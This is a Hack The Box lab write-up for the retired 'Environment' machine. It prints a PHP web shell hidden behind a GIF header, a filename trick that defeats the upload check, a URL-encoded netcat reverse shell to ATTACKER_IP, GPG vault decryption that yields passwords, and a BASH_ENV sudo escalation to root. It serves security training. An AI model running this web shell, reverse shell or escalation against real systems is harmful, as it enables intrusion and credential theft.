---
title: "🌱 HTB Environment Write-up"
name: Environment
date: 2025-09-07
last_modified_at: 2025-11-01
difficulty: Medium
os: Linux
skills: "Enumeration, Web Fuzzing, SQL Injection, Authentication Bypass, Arbitrary File Upload, Web Shell, Reverse Shell, Database Looting, Privilege Escalation, Sudo Privilege Exploit, BASH_ENV in non-interactive script"
tools: "rustscan, nmap, ffuf, Burp Suite, CVE-2024-52301, revshells, nc, sqlite3, gpg, sudo"
published: true
---

![](images/Pasted%20image%2020250720194844.png)

## 📝 Summary

A hidden `/login` page on the Environment web server exposed an SQL injection vulnerability in the `remember` parameter. The error messages were overly verbose and even revealed a code snippet showing that authentication could be bypassed by simply switching the Laravel environment to `preprod`.

This allowed me to access the administrative dashboard as user Hish. The dashboard included a profile picture upload feature, which I abused and bypassed the file validation checks to upload a web shell.  With the web shell in place, I achieved remote code execution (RCE) and upgraded to a fully interactive reverse shell as user www-data.

Weak permissions on Hish’s home directory allowed www-data to read sensitive files, including his GPG private key and a password vault. The vault was unlocked with the exposed private key, revealing Hish’s SSH password.

I then logged in over SSH as Hish and found that he could run `/usr/bin/systeminfo` with `sudo`. The script couldn’t be modified, and nothing inside it was interactive, but since the `BASH_ENV` environment variable was preserved in `sudo`, I was able to abuse it and escalate to a root shell.

## 🔓⚡ Authentication bypass

### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 9.2p1
- `80/tcp`: nginx 1.22.1

```
fcoomans@kali:~/htb/environment$ rustscan -a 10.10.11.67 --tries 5 --ulimit 10000 -- -sCV -oA environment_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.67:22
Open 10.10.11.67:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA environment_tcp_all" on ip 10.10.11.67
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 15:18 SAST

<SNIP>

Nmap scan report for 10.10.11.67
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2025-07-19 15:18:37 SAST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `environment.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/environment$ grep environment.htb /etc/hosts
10.10.11.67     environment.htb
```

I open the site and find a website about preserving the environment.

![](images/Pasted%20image%2020250720162709.png)

Fuzzing the website using `ffuf` reveals a `/login` endpoint/page.
 
```
fcoomans@kali:~/htb/environment$ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt:FUZZ -u http://environment.htb/FUZZ -ic -t 60 -fs 153

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://environment.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 153
________________________________________________

login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 245ms]
upload/                 [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 556ms]
:: Progress: [2565/2565] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

I navigate to `/login` and log in with fake credentials, but intercept the traffic with Burp Suite.

![](images/Pasted%20image%2020250720162258.png)

The single-quote SQL injection detection payload is added to each parameter and finally added to the `remember` parameter.  Forwarding the login form and then stopping Interception mode reveals something really interesting...

![](images/Pasted%20image%2020250720162420.png)

An extremely verbose error message is displayed that reveals that `Laravel 11.30.0` is used.
It also reveals a code block in the `routes/web.php` file that states that if the environment is `preprod`, then authentication should be bypassed and the user id should be set to 1.  I presume this is an administrator user.  The user is then redirected to `/management/dashboard`.

![](images/Pasted%20image%2020250720162535.png)

The message also reveals that the backend database used is SQLite.

![](images/Pasted%20image%2020250720162621.png)

SQL injections are a promising attack vector, but since the backend is running SQLite, this is very limiting and gaining remote code execution (RCE) is more complex...

Searching for `laravel 11.30.0 environment exploit poc` shows that  `Laravel 11.30.0` is vulnerable to `CVE-2024-52301`, which allows the environment to be changed.  This will bypass authentication and give administrative access immediately.  This is a more promising attack vector.

### 🧪 Exploitation

#### 🐞 CVE-2024-52301

https://github.com/Nyamort/CVE-2024-52301 explains that simply adding `?--env=preprod` to the request should change the environment to `preprod` on this machine.

I log in again and intercept the request with Burp Suite.  The requested endpoint is changed to `/login?--env=preprod` and forwarded to the server, and then interception mode is disabled.

![](images/Pasted%20image%2020250720163141.png)

### 💰 Post Exploitation

Authentication is bypassed, as seen in the leaked code snippet in the verbose error message and the dashboard for user `Hish` is opened.

![](images/Pasted%20image%2020250720163205.png)

## 📂💣 Arbitrary File Upload

### 🔎 Recon

A profile picture can be uploaded for user `Hish`.

![](images/Pasted%20image%2020250720163313.png)

And can then be accessed from the URL.  The default profile picture can be accessed at http://environment.htb/storage/files/hish.png.  This gets me thinking; what if I can upload a webshell?

![](images/Pasted%20image%2020250720163340.png)

I create a simple PHP webshell.

```
fcoomans@kali:~/htb/environment$ echo -n '<?php system($_REQUEST["cmd"]); ?>' >webshell.php

fcoomans@kali:~/htb/environment$ cat webshell.php
<?php system($_REQUEST["cmd"]); ?>
```

And upload it as the profile picture.

![](images/Pasted%20image%2020250720163519.png)

But get the error message `Invalid file detected`.

![](images/Pasted%20image%2020250720182840.png)

I add `GIF89` as the header to the file and change the PHP code to display `Hello World!`.

```
fcoomans@kali:~/htb/environment$ echo -e 'GIF89\n<?php echo("Hello World!"); ?>' >hello.gif

fcoomans@kali:~/htb/environment$ cat hello.gif
GIF89
<?php echo("Hello World!"); ?>
```

The file is now detected as a GIF image file.

```
fcoomans@kali:~/htb/environment$ file hello.gif 
hello.gif: GIF image data 16188 x 26736
```

I uploaded `hello.gif`, but when I tried to access the file using `curl`, I notice that the file is not executed, but the PHP code is printed instead.  The extension has to be changed to something that PHP can execute.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/hello.gif"
GIF89
<?php echo("Hello World!"); ?>
```

Adding a double-extension with a space reveals a crucial piece of information;  `hello .php .gif` is saved as `hello .php.gif`.  What happened to the second space?  It looks like the application removed it!

![](images/Pasted%20image%2020250720183107.png)

I try the filename `hello.php .`, and the file gets uploaded as `hello.php`.

![](images/Pasted%20image%2020250720183158.png)

The file is accessed using `curl`, and this time the source code is not displayed, but executed instead and `Hello World!` is displayed.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/hello.php"
GIF89
Hello World!
```

### 🧪 Exploitation

#### 🐚 Webshell

I create an MD5 hash of my name.  I then add the basic PHP webshell `<?php system($_REQUEST["cmd"]); ?>` to a GIF file, where the filename is the MD5 hash of my name.

```
fcoomans@kali:~/htb/environment$ echo -n 'fcoomans' |md5sum
8f01f44e140d7b693b4a655ad4e9de9b  -

fcoomans@kali:~/htb/environment$ echo -e 'GIF89\n<?php system($_REQUEST["cmd"]); ?>' >8f01f44e140d7b693b4a655ad4e9de9b.gif

fcoomans@kali:~/htb/environment$ cat 8f01f44e140d7b693b4a655ad4e9de9b.gif
GIF89
<?php system($_REQUEST["cmd"]); ?>
```

I upload the file and then use Burp Suite `Repeater` to change the file name to `8f01f44e140d7b693b4a655ad4e9de9b.php .` and it gets uploaded to http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php.

![](images/Pasted%20image%2020250720184446.png)

Accessing the URL using `curl` and passing in the parameter `cmd=id`, prints the user information for user `www-data`.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php?cmd=id"
GIF89
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I use https://www.revshells.com to generate a `nc mkfifo` reverse shell.  The payload is URL encoded and when executed will spawn a `bash` shell on the target.

![](images/Pasted%20image%2020250720184731.png)

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/environment$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And the reverse shell is passed to the `cmd` parameter in my webshell.

```
fcoomans@kali:~/htb/environment$ curl -s "http://environment.htb/storage/files/8f01f44e140d7b693b4a655ad4e9de9b.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%204444%20%3E%2Ftmp%2Ff"
```

### 💰 Post Exploitation

#### 👣 Foothold as www-data

The `nc` listener catches the reverse shell. 

```
fcoomans@kali:~/htb/environment$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.67] 50346
bash: cannot set terminal process group (916): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 🔼 Priv Esc to Hish

### 🔎 Recon

Looking at `/etc/passwd` shows that the only relevant users with shell access are `root` and user Hish.

```
www-data@environment:~/app$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
```

I search for the SQLite database used by the web application and find it under `database/database.sqlite`.

```
www-data@environment:~/app$ find . -iname '*.sqlite'
find . -iname '*.sqlite'
./database/database.sqlite
```

The simple Python code snippet `import pty;pty.spawn("/bin/bash")` spawns an interactive PTY bash shell.

```
www-data@environment:~/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

`sqlite3` is then used to access the SQLite database.  The user password hashes for the users are dumped.  I couldn't crack Hish's password hash.

```
www-data@environment:~/app$ sqlite3 ./database/database.sqlite
sqlite3 ./database/database.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
.tables
cache                  jobs                   sessions
cache_locks            mailing_list           users
failed_jobs            migrations
job_batches            password_reset_tokens
sqlite> .schema users
.schema users
CREATE TABLE IF NOT EXISTS "users" ("id" integer primary key autoincrement not null, "name" varchar not null, "email" varchar not null, "email_verified_at" datetime, "password" varchar not null, "remember_token" varchar, "created_at" datetime, "updated_at" datetime, "profile_picture" varchar);
CREATE UNIQUE INDEX "users_email_unique" on "users" ("email");
sqlite> select name,password from users;
select name,password from users;
Hish|$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
Jono|$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
Bethany|$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
sqlite> .exit
.exit
```

I then noticed that `www-data` can access Hish's home directory, due to weak permissions on the home directory.  I also noticed some GPG private keys and a `~/backup/keyvault.gpg` file.

```
www-data@environment:~/app$ find /home/hish
find /home/hish
/home/hish
/home/hish/backup
/home/hish/backup/keyvault.gpg
/home/hish/user.txt
/home/hish/.bash_history
/home/hish/.bash_logout
/home/hish/.local
/home/hish/.local/share
/home/hish/.local/share/caddy
/home/hish/.local/share/caddy/locks
/home/hish/.local/share/caddy/locks/storage_clean.lock
/home/hish/.local/share/caddy/instance.uuid
/home/hish/.local/share/nano
/home/hish/.local/share/nano/search_history
/home/hish/.local/share/composer
/home/hish/.local/share/composer/.htaccess
/home/hish/.gnupg
/home/hish/.gnupg/private-keys-v1.d
/home/hish/.gnupg/private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key
/home/hish/.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key
/home/hish/.gnupg/trustdb.gpg
/home/hish/.gnupg/pubring.kbx
/home/hish/.gnupg/openpgp-revocs.d
/home/hish/.gnupg/openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev
/home/hish/.gnupg/pubring.kbx~
/home/hish/.gnupg/random_seed
/home/hish/.profile
/home/hish/.bashrc
```

### 🧪 Exploitation

The temporary directory `/tmp/fc` is created.

```
www-data@environment:~/app$ mkdir /tmp/fc
mkdir /tmp/fc
www-data@environment:~/app$ cd /tmp/fc
cd /tmp/fc
```

Hish's `~/.gnupg` directory is then copied to the temporary directory, and the permissions are changed to `700`, otherwise GPG won't read the files due to weak permissions.

```
www-data@environment:/tmp/fc$ cp -r /home/hish/.gnupg/* .
cp -r /home/hish/.gnupg/* .
www-data@environment:/tmp/fc$ chmod -R 700 .
chmod -R 700 .
www-data@environment:/tmp/fc$ ls -lha
ls -lha
total 32K
drwx------  4 www-data www-data 4.0K Jul 21 03:08 .
drwxrwxrwt 10 root     root     4.0K Jul 21 03:08 ..
drwx------  2 www-data www-data 4.0K Jul 21 03:08 openpgp-revocs.d
drwx------  2 www-data www-data 4.0K Jul 21 03:08 private-keys-v1.d
-rwx------  1 www-data www-data 1.5K Jul 21 03:08 pubring.kbx
-rwx------  1 www-data www-data   32 Jul 21 03:08 pubring.kbx~
-rwx------  1 www-data www-data  600 Jul 21 03:08 random_seed
-rwx------  1 www-data www-data 1.3K Jul 21 03:08 trustdb.gpg
```

GPG is used to list the keys, and the private key is then used to decrypt the `/home/hish/backup/keyvault.gpg` Key Vault.  This reveals some passwords for Hish and, in particular, the password `marineSPm@ster!!` for `ENVIRONMENT.HTB`.

```
www-data@environment:/tmp/fc$ gpg --homedir . --list-secret-keys
gpg --homedir . --list-secret-keys
/tmp/fc/pubring.kbx
-------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]

www-data@environment:/tmp/fc$ gpg --homedir . --decrypt /home/hish/backup/keyvault.gpg
<-homedir . --decrypt /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

### 💰 Post Exploitation

I SSH to `environment.htb` with user `hish` using the password `marineSPm@ster!!` and log in successfully.

```
fcoomans@kali:~/htb/environment$ ssh hish@environment.htb
hish@environment.htb's password:
Linux environment 6.1.0-34-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Last login: Mon Jul 21 03:12:43 2025 from ATTACKER_IP
hish@environment:~$ id
uid=1000(hish) gid=1000(hish) groups=1000(hish),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

#### 🚩 user.txt

Hish holds the `user.txt` flag.

```
hish@environment:~$ cat /home/hish/user.txt
2c6e4af8a6494303506b024bb6327cf4
```

## 🔼 Priv Esc to Root

### 🔎 Recon

`sudo -l` shows that Hish can access the program `/usr/bin/systeminfo` as `root`.  Interestingly, the environment variables `ENV` and `BASE_ENV` is kept when `sudo` is used to run the program.

```
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

`/usr/bin/systeminfo` is a Bash script, that is only readable by user Hish.

```
hish@environment:~$ ls -lh /usr/bin/systeminfo
-rwxr-xr-x 1 root root 452 Jan 12  2025 /usr/bin/systeminfo
hish@environment:~$ file /usr/bin/systeminfo
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
```

I look at the file and don't see anything that can be exploited as nothing is run interactively.

```bash
hish@environment:~$ nl -b a /usr/bin/systeminfo
     1  #!/bin/bash
     2  echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
     3  dmesg | tail -n 10
     4
     5  echo -e "\n### Checking system-wide open ports ###"
     6  ss -antlp
     7
     8  echo -e "\n### Displaying information about all mounted filesystems ###"
     9  mount | column -t
    10
    11  echo -e "\n### Checking system resource limits ###"
    12  ulimit -a
    13
    14  echo -e "\n### Displaying loaded kernel modules ###"
    15  lsmod | head -n 10
    16
    17  echo -e "\n### Checking disk usage for all filesystems ###"
    18  df -h
```

I search how `BASH_ENV` is used in bash and fin this in the bash manual (https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html):

```
#### Invoked non-interactively[](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html#Invoked-non_002dinteractively)

When Bash is started non-interactively, to run a shell script, for example, it looks for the variable `BASH_ENV` in the environment, expands its value if it appears there, and uses the expanded value as the name of a file to read and execute.
```

So, `BASH_ENV` points to a script that will be executed before the non-interactive program is run.

### 🧪 Exploitation

I create a simple `root.sh` file that will start a Bash shell.  `chmod` is used to make the file executable.

```
hish@environment:~$ echo -e '#!/bin/bash\n/bin/bash' >/dev/shm/root.sh
hish@environment:~$ cat /dev/shm/root.sh
#!/bin/bash
/bin/bash
hish@environment:~$ chmod +x /dev/shm/root.sh
```

The `BASH_ENV` environment variable is then pointed to the `root.sh` file. 

```
hish@environment:~$ export BASH_ENV=/dev/shm/root.sh
```

Running the program `/usr/bin/systeminfo` with `sudo` causes the script in `BASH_ENV` to run.  This script runs the program `/bin/bash` as the `root` user (due to `sudo`) and gives me a root shell.

```
hish@environment:~$ sudo /usr/bin/systeminfo
/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` is the holder of the `root.txt` flag.

```
root@environment:~# cat /root/root.txt
8c62b077a5eb1587235aa26582101e2d
```

Proof that a weak Environment can be fatal. 🌱💀

And `Environment has been Pwned!` 🎉

![](images/Pasted%20image%2020250720194646.png)

## 📚 Lessons Learned

- **Verbose error messages** can leak sensitive details about the application and its logic. Error handling should be generic in production to avoid giving attackers clues.
- **Outdated frameworks** (like Laravel in this case) often contain known vulnerabilities and should be kept updated to the latest secure version.
- **Weak file validation** allowed me to upload a web shell. File upload features should strictly validate file types and never allow direct execution of uploaded files.
- **Loose home directory permissions** exposed private keys and password vaults. User directories should be properly secured to prevent unauthorized access.
- **Storing passwords inside GPG vaults** on the same host with accessible private keys defeats the purpose of encryption and creates a single point of failure.
- **Sudo permissions on non-interactive scripts** may seem harmless, but if environment variables like `BASH_ENV` are preserved, they can be abused for privilege escalation.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.

